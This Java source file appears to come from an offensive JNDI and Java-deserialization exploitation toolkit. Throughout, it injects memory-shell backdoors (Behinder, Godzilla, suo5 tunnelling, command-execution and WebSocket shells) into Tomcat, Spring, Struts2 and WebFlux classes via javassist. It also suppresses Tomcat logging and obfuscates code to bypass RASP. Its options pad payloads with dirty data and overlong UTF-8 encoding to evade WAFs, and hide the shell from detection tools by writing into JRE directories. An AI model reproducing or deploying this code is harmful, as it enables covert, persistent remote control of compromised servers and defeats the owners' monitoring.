package com.qi4l.jndi.gadgets.utils;

import com.qi4l.jndi.gadgets.Config.Config;
import com.qi4l.jndi.template.Agent.WinMenshell;
import com.qi4l.jndi.template.memshell.tomcat.TSMSFromJMXF;
import javassist.*;
import org.apache.commons.cli.CommandLine;
import org.apache.commons.cli.CommandLineParser;
import org.apache.commons.cli.DefaultParser;
import org.apache.commons.cli.Options;
import org.apache.commons.codec.binary.Base64;

import java.lang.reflect.Field;
import java.util.Arrays;
import java.util.List;

import static com.qi4l.jndi.gadgets.Config.MemShellPayloads.*;
import static com.qi4l.jndi.gadgets.utils.HexUtils.generatePassword;
import static com.qi4l.jndi.template.memshell.shell.MemShellPayloads.SUO5.CMD_SHELL_FOR_WEBFLUX;

public class InjShell {

    public static CommandLine cmdLine;
    public static void insertKeyMethod(CtClass ctClass, String type) throws Exception {

        // 判断是否为 Tomcat 类型，需要对 request 封装使用额外的 payload
        String name = ctClass.getName();
        name = name.substring(name.lastIndexOf(".") + 1);

        // 大多数 SpringBoot 项目使用内置 Tomcat
        boolean isTomcat  = name.startsWith("T") || name.startsWith("Spring");
        boolean isWebflux = name.contains("Webflux");

        // 判断是 filter 型还是 servlet 型内存马，根据不同类型写入不同逻辑
        String method = "";
        if (name.contains("SpringControllerMS")) {
            method = "drop";
        } else if (name.contains("Struts2ActionMS")) {
            method = "executeAction";
        }

        List<CtClass> classes = new java.util.ArrayList<CtClass>(Arrays.asList(ctClass.getInterfaces()));
        classes.add(ctClass.getSuperclass());

        for (CtClass value : classes) {
            String className = value.getName();
            if (Config.KEY_METHOD_MAP.containsKey(className)) {
                method = Config.KEY_METHOD_MAP.get(className);
                break;
            }
        }

        // 命令执行、各种内存马
        insertField(ctClass, "HEADER_KEY", "public static String HEADER_KEY=" + converString(Config.HEADER_KEY) + ";");
        insertField(ctClass, "HEADER_VALUE", "public static String HEADER_VALUE=" + converString(Config.HEADER_VALUE) + ";");

        if ("bx".equals(type)) {
            try {
                ctClass.getDeclaredMethod("base64Decode");
            } catch (NotFoundException e) {
                ctClass.addMethod(CtMethod.make(Utils.base64Decode(BASE64_DECODE_STRING_TO_BYTE), ctClass));
            }

            try {
                ctClass.getDeclaredMethod("getFieldValue");
            } catch (NotFoundException e) {
                ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_FIELD_VALUE), ctClass));
            }

            try {
                ctClass.getDeclaredMethod("getMethodByClass");
            } catch (NotFoundException e) {
                ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_METHOD_BY_CLASS), ctClass));
            }

            try {
                ctClass.getDeclaredMethod("getMethodAndInvoke");
            } catch (NotFoundException e) {
                ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_METHOD_AND_INVOKE), ctClass));
            }

            if (Config.IS_OBSCURE) {
                ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_UNSAFE), ctClass));
            }

            String shell = "";
            if (isTomcat) {
                insertTomcatNoLog(ctClass);
                shell = Config.IS_OBSCURE ? BEHINDER_SHELL_FOR_TOMCAT_OBSCURE : BEHINDER_SHELL_FOR_TOMCAT;
            } else {
                shell = Config.IS_OBSCURE ? BEHINDER_SHELL_OBSCURE : BEHINDER_SHELL;
            }

            insertMethod(ctClass, method, Utils.base64Decode(shell).replace("f359740bd1cda994", Config.PASSWORD));
        } else if ("gz".equals(type)) {
            insertField(ctClass, "payload", "Class payload ;");
            insertField(ctClass, "xc", "String xc = " + converString(Config.GODZILLA_KEY) + ";");
            insertField(ctClass, "PASS", "String PASS = " + converString(Config.PASSWORD_ORI) + ";");

            try {
                ctClass.getDeclaredMethod("base64Decode");
            } catch (NotFoundException e) {
                ctClass.addMethod(CtMethod.make(Utils.base64Decode(BASE64_DECODE_STRING_TO_BYTE), ctClass));
            }

            ctClass.addMethod(CtMethod.make(Utils.base64Decode(BASE64_ENCODE_BYTE_TO_STRING), ctClass));
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(MD5), ctClass));
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(AES_FOR_GODZILLA), ctClass));
            insertTomcatNoLog(ctClass);
            if (isWebflux) {
                insertMethod(ctClass, method, Utils.base64Decode(GODZILLA_SHELL_FOR_WEBFLUX));
            } else {
                insertMethod(ctClass, method, Utils.base64Decode(GODZILLA_SHELL));
            }
        } else if ("gzraw".equals(type)) {
            insertField(ctClass, "payload", "Class payload ;");
            insertField(ctClass, "xc", "String xc = " + converString(Config.GODZILLA_KEY) + ";");

            ctClass.addMethod(CtMethod.make(Utils.base64Decode(AES_FOR_GODZILLA), ctClass));
            insertTomcatNoLog(ctClass);
            insertMethod(ctClass, method, Utils.base64Decode(GODZILLA_RAW_SHELL));
        } else if ("suo5".equals(type)) {

            // 先写入一些需要的基础属性
            insertField(ctClass, "gInStream", "java.io.InputStream gInStream;");
            insertField(ctClass, "gOutStream", "java.io.OutputStream gOutStream;");

            // 依次写入方法
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(SUO5.SUO5_NEW_CREATE), ctClass));
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(SUO5.SUO5_NEW_DATA), ctClass));
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(SUO5.SUO5_NEW_DEL), ctClass));
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(SUO5.SUO5_SET_STREAM), ctClass));
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(SUO5.SUO5_NEW_STATUS), ctClass));
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(SUO5.SUO5_U32_TO_BYTES), ctClass));
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(SUO5.SUO5_BYTES_TO_U32), ctClass));
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(SUO5.SUO5_MARSHAL), ctClass));
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(SUO5.SUO5_UNMARSHAL), ctClass));
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(SUO5.SUO5_READ_SOCKET), ctClass));
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(SUO5.SUO5_READ_INPUT_STREAM_WITH_TIMEOUT), ctClass));
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(SUO5.SUO5_TRY_FULL_DUPLEX), ctClass));
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(SUO5.SUO5_READ_REQ), ctClass));
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(SUO5.SUO5_PROCESS_DATA_UNARY), ctClass));
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(SUO5.SUO5_PROCESS_DATA_BIO), ctClass));

            // 为恶意类设置 Runnable 接口以及 RUN 方法
            CtClass runnableClass = ClassPool.getDefault().get("java.lang.Runnable");
            ctClass.addInterface(runnableClass);
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(SUO5.RUN), ctClass));

            // 插入关键方法
            insertMethod(ctClass, method, Utils.base64Decode(SUO5.SUO5));
        } else if ("execute".equals(type)) {
            insertField(ctClass, "TAG", "public static String TAG = \"" + Config.CMD_HEADER_STRING + "\";");
            insertCMD(ctClass);
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_REQUEST), ctClass));
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(BASE64_ENCODE_BYTE_TO_STRING), ctClass));
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_RESPONSE), ctClass));

            insertMethod(ctClass, method, Utils.base64Decode(EXECUTOR_SHELL));
        } else if ("ws".equals(type)) {
            insertCMD(ctClass);
            insertMethod(ctClass, method, Utils.base64Decode(WS_SHELL));
        } else if ("upgrade".equals(type)) {
            insertField(ctClass, "CMD_HEADER", "public static String CMD_HEADER = " + converString(Config.CMD_HEADER_STRING) + ";");

            ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_FIELD_VALUE), ctClass));
            insertCMD(ctClass);
            insertMethod(ctClass, method, Utils.base64Decode(UPGRADE_SHELL));
        } else {
            insertCMD(ctClass);
            insertField(ctClass, "CMD_HEADER", "public static String CMD_HEADER = " + converString(Config.CMD_HEADER_STRING) + ";");

            if (isWebflux) {
                insertMethod(ctClass, method, Utils.base64Decode(CMD_SHELL_FOR_WEBFLUX));
            } else if (isTomcat) {
                insertTomcatNoLog(ctClass);
                insertMethod(ctClass, method, Utils.base64Decode(CMD_SHELL_FOR_TOMCAT));
            } else {
                insertMethod(ctClass, method, Utils.base64Decode(CMD_SHELL));
            }
        }

        ctClass.setName(ClassNameUtils.generateClassName());
        insertField(ctClass, "pattern", "public static String pattern = " + converString(Config.URL_PATTERN) + ";");

    }

    // 恶心一下人，实际没用
    public static String converString(String target) {
        if (Config.IS_OBSCURE) {
            StringBuilder result = new StringBuilder("new String(new byte[]{");
            byte[]        bytes  = target.getBytes();
            for (int i = 0; i < bytes.length; i++) {
                result.append(bytes[i]).append(",");
            }
            return result.substring(0, result.length() - 1) + "})";
        }

        return "\"" + target + "\"";
    }

    public static void insertMethod(CtClass ctClass, String method, String payload) throws NotFoundException, CannotCompileException {
        //添加到类路径，防止出错
        ClassPool pool;
        pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(TSMSFromJMXF.class));
        // 根据传入的不同参数，在不同方法中插入不同的逻辑
        CtMethod cm = ctClass.getDeclaredMethod(method);
        cm.setBody(payload);
    }

    /**
     * 向指定类中写入命令执行方法 execCmd
     * 方法需要 toCString getMethodByClass getMethodAndInvoke getFieldValue 依赖方法
     *
     * @param ctClass 指定类
     * @throws Exception 抛出异常
     */
    public static void insertCMD(CtClass ctClass) throws Exception {

        if (Config.IS_OBSCURE) {
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(TO_CSTRING_Method), ctClass));
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_METHOD_BY_CLASS), ctClass));
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_METHOD_AND_INVOKE), ctClass));
            try {
                ctClass.getDeclaredMethod("getFieldValue");
            } catch (NotFoundException e) {
                ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_FIELD_VALUE), ctClass));
            }
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(EXEC_CMD_OBSCURE), ctClass));
        } else {
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(EXEC_CMD), ctClass));
        }
    }

    public static void insertField(CtClass ctClass, String fieldName, String fieldCode) throws Exception {
        ctClass.defrost();
        try {
            CtField ctSUID = ctClass.getDeclaredField(fieldName);
            ctClass.removeField(ctSUID);
        } catch (javassist.NotFoundException ignored) {
        }
        ctClass.addField(CtField.make(fieldCode, ctClass));
    }

    public static void TinsertWinAgent(CtClass ctClass) throws Exception {
        List<CtClass> classes = new java.util.ArrayList<>(Arrays.asList(ctClass.getInterfaces()));
        classes.add(ctClass.getSuperclass());

        String className = null;
        for (CtClass value : classes) {
            className = value.getName();
            if (Config.KEY_METHOD_MAP.containsKey(className)) {
                break;
            }
        }

        byte[]   bytes        = ctClass.toBytecode();
        Class<?> ctClazz      = Class.forName("com.qi4l.jndi.template.Agent.WinMenshell");
        Field    WinClassName = ctClazz.getDeclaredField("className");
        WinClassName.setAccessible(true);
        WinClassName.set(ctClazz, className);
        Field WinclassBody = ctClazz.getDeclaredField("classBody");
        WinclassBody.setAccessible(true);
        WinclassBody.set(ctClazz, bytes);
    }

    public static void TinsertLinAgent(CtClass ctClass) throws Exception {
        List<CtClass> classes = new java.util.ArrayList<>(Arrays.asList(ctClass.getInterfaces()));
        classes.add(ctClass.getSuperclass());

        String className = null;
        for (CtClass value : classes) {
            className = value.getName();
            if (Config.KEY_METHOD_MAP.containsKey(className)) {
                break;
            }
        }
        byte[]   bytes        = ctClass.toBytecode();
        Class<?> ctClazz      = Class.forName("com.qi4l.jndi.template.Agent.LinMenshell");
        Field    LinClassName = ctClazz.getDeclaredField("className");
        LinClassName.setAccessible(true);
        LinClassName.set(ctClazz, className);
        Field LinclassBody = ctClazz.getDeclaredField("classBody");
        LinclassBody.setAccessible(true);
        LinclassBody.set(ctClazz, bytes);
    }


    public static String structureShellTom(Class<?> payload) throws Exception {
        Config.init();
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(payload));
        CtClass ctClass = pool.get(payload.getName());
        InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, Config.Shell_Type);
        ctClass.setName(ClassNameUtils.generateClassName());
        if (Config.winAgent) {
            TinsertWinAgent(ctClass);
            return injectClass(WinMenshell.class);
        }
        if (Config.linAgent) {
            TinsertLinAgent(ctClass);
            return injectClass(WinMenshell.class);
        }
        if (Config.HIDE_MEMORY_SHELL) {
            switch (Config.HIDE_MEMORY_SHELL_TYPE) {
                case 1:
                    break;
                case 2:
                    CtClass newClass = pool.get("com.qi4l.jndi.template.HideMemShellTemplate");
                    newClass.setName(ClassNameUtils.generateClassName());
                    String content = "b64=\"" + Base64.encodeBase64String(ctClass.toBytecode()) + "\";";
                    String className = "className=\"" + ctClass.getName() + "\";";
                    newClass.defrost();
                    newClass.makeClassInitializer().insertBefore(content);
                    newClass.makeClassInitializer().insertBefore(className);

                    if (Config.IS_INHERIT_ABSTRACT_TRANSLET) {
                        Class abstTranslet = Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet");
                        CtClass superClass = pool.get(abstTranslet.getName());
                        newClass.setSuperclass(superClass);
                    }

                    return injectClass(newClass.getClass());
            }
        }
        return injectClass(ctClass.getClass());
    }

    //类加载方式，因类而异
    public static String injectClass(Class clazz) {

        String classCode = null;
        try {
            //获取base64后的类
            classCode = Util.getClassCode(clazz);

        } catch (Exception e) {
            e.printStackTrace();
        }

        return "var bytes = org.apache.tomcat.util.codec.binary.Base64.decodeBase64('" + classCode + "');\n" +
                "var classLoader = java.lang.Thread.currentThread().getContextClassLoader();\n" +
                "try{\n" +
                "   var clazz = classLoader.loadClass('" + clazz.getName() + "');\n" +
                "   clazz.newInstance();\n" +
                "}catch(err){\n" +
                "   var method = java.lang.ClassLoader.class.getDeclaredMethod('defineClass', ''.getBytes().getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);\n" +
                "   method.setAccessible(true);\n" +
                "   var clazz = method.invoke(classLoader, bytes, 0, bytes.length);\n" +
                "   clazz.newInstance();\n" +
                "};";
    }

    public static void insertTomcatNoLog(CtClass ctClass) throws Exception {

        try {
            ctClass.getDeclaredMethod("getFieldValue");
        } catch (NotFoundException e) {
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_FIELD_VALUE), ctClass));
        }

        try {
            ctClass.getDeclaredMethod("getMethodByClass");
        } catch (NotFoundException e) {
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_METHOD_BY_CLASS), ctClass));
        }

        try {
            ctClass.getDeclaredMethod("getMethodAndInvoke");
        } catch (NotFoundException e) {
            if (Config.IS_OBSCURE) {
                ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_METHOD_AND_INVOKE_OBSCURE), ctClass));
            } else {
                ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_METHOD_AND_INVOKE), ctClass));
            }
        }

        ctClass.addMethod(CtMethod.make(Utils.base64Decode(TOMCAT_NO_LOG), ctClass));
    }

    private static Options getOptions() {
        Options options = new Options();
        options.addOption("yso", "ysoserial", true, "Java deserialization");
        options.addOption("g", "gadget", true, "Java deserialization gadget");
        options.addOption("p", "parameters", true, "Gadget parameters");
        options.addOption("dt", "dirty-type", true, "Using dirty data to bypass WAF，type: 1:Random Hashable Collections/2:LinkedList Nesting/3:TC_RESET in Serialized Data");
        options.addOption("dl", "dirty-length", true, "Length of dirty data when using type 1 or 3/Counts of Nesting loops when using type 2");
        options.addOption("f", "file", true, "Write Output into FileOutputStream (Specified FileName)");
        options.addOption("o", "obscure", false, "Using reflection to bypass RASP");
        options.addOption("i", "inherit", false, "Make payload inherit AbstractTranslet or not (Lower JDK like 1.6 should inherit)");
        options.addOption("u", "url", true, "MemoryShell binding url pattern,default [/version.txt]");
        options.addOption("pw", "password", true, "Behinder or Godzilla password,default [p@ssw0rd]");
        options.addOption("gzk", "godzilla-key", true, "Godzilla key,default [key]");
        options.addOption("hk", "header-key", true, "MemoryShell Header Check,Request Header Key,default [Referer]");
        options.addOption("hv", "header-value", true, "MemoryShell Header Check,Request Header Value,default [https://QI4L.cn/]");
        options.addOption("ch", "cmd-header", true, "Request Header which pass the command to Execute,default [X-Token-Data]");
        options.addOption("gen", "gen-mem-shell", false, "Write Memory Shell Class to File");
        options.addOption("n", "gen-mem-shell-name", true, "Memory Shell Class File Name");
        options.addOption("h", "hide-mem-shell", false, "Hide memory shell from detection tools (type 2 only support SpringControllerMS)");
        options.addOption("ht", "hide-type", true, "Hide memory shell,type 1:write /jre/lib/charsets.jar 2:write /jre/classes/");
        options.addOption("rh", "rhino", false, "ScriptEngineManager Using Rhino Engine to eval JS");
        options.addOption("ncs", "no-com-sun", false, "Force Using org.apache.XXX.TemplatesImpl instead of com.sun.org.apache.XXX.TemplatesImpl");
        options.addOption("mcl", "mozilla-class-loader", false, "Using org.mozilla.javascript.DefiningClassLoader in TransformerUtil");
        options.addOption("dcfp", "define-class-from-parameter", true, "Customize parameter name when using DefineClassFromParameter");
        options.addOption("utf", "utf8-Overlong-Encoding", false, "UTF-8 Overlong Encoding Bypass waf");
        return options;
    }
    public static void init(String[] args) throws Exception {
        final Options options = getOptions();

        CommandLineParser parser = new DefaultParser();

        try {
            cmdLine = parser.parse(options, args);
        } catch (Exception e) {
            System.out.println("[*] Parameter input error, please use -h for more information");
            System.exit(1);
        }

        if (cmdLine.hasOption("inherit")) {
            Config.IS_INHERIT_ABSTRACT_TRANSLET = true;
        }

        if (cmdLine.hasOption("obscure")) {
            Config.IS_OBSCURE = true;
        }

        if (cmdLine.hasOption("cmd-header")) {
            Config.CMD_HEADER_STRING = cmdLine.getOptionValue("cmd-header");
        }

        if (cmdLine.hasOption("url")) {
            String url = cmdLine.getOptionValue("url");
            if (!url.startsWith("/")) {
                url = "/" + url;
            }
            Config.URL_PATTERN = url;
        }

        if (cmdLine.hasOption("define-class-from-parameter")) {
            Config.PARAMETER = cmdLine.getOptionValue("define-class-from-parameter");
        }

        if (cmdLine.hasOption("file")) {
            Config.WRITE_FILE = true;
            Config.FILE = cmdLine.getOptionValue("file");
        }

        if (cmdLine.hasOption("password")) {
            Config.PASSWORD_ORI = cmdLine.getOptionValue("password");
            Config.PASSWORD = generatePassword(Config.PASSWORD_ORI);
        }

        if (cmdLine.hasOption("godzilla-key")) {
            Config.GODZILLA_KEY = generatePassword(cmdLine.getOptionValue("godzilla-key"));
        }

        if (cmdLine.hasOption("header-key")) {
            Config.HEADER_KEY = cmdLine.getOptionValue("header-key");
        }

        if (cmdLine.hasOption("header-value")) {
            Config.HEADER_VALUE = cmdLine.getOptionValue("header-value");
        }

        if (cmdLine.hasOption("no-com-sun")) {
            Config.FORCE_USING_ORG_APACHE_TEMPLATESIMPL = true;
        }

        if (cmdLine.hasOption("mozilla-class-loader")) {
            Config.USING_MOZILLA_DEFININGCLASSLOADER = true;
        }

        if (cmdLine.hasOption("rhino")) {
            Config.USING_RHINO = true;
        }

        if (cmdLine.hasOption("utf8-Overlong-Encoding")) {
            Config.IS_UTF_Bypass = true;
        }

        if (cmdLine.hasOption("gen-mem-shell")) {
            Config.GEN_MEM_SHELL = true;

            if (cmdLine.hasOption("gen-mem-shell-name")) {
                Config.GEN_MEM_SHELL_FILENAME = cmdLine.getOptionValue("gen-mem-shell-name");
            }
        }

        if (cmdLine.hasOption("hide-mem-shell")) {
            Config.HIDE_MEMORY_SHELL = true;

            if (cmdLine.hasOption("hide-type")) {
                Config.HIDE_MEMORY_SHELL_TYPE = Integer.parseInt(cmdLine.getOptionValue("hide-type"));
            }
        }

    }
}